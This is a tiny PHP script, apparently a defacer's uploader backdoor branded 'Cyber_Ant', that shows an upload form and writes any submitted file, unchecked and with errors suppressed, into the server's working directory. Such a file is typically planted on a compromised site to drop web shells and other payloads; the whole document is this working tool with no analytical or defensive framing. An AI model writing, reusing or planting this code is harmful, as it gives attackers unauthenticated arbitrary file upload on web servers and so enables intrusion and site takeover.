<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="Cyber_Ant" type="submit" id="Cyber_Ant" value="Upload" class="button"></form>';
if( $_POST['Cyber_Ant'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><font color="red" font face="Iceland"><marquee behavior="slide" direction="right" scrollamount="45">Upload Mantab!!!</marquee></font></b><br><br>'; }
else { echo '<b><blink><font color="red">Upload Fail !!!</font></blink></b><br><br>'; }
}
?>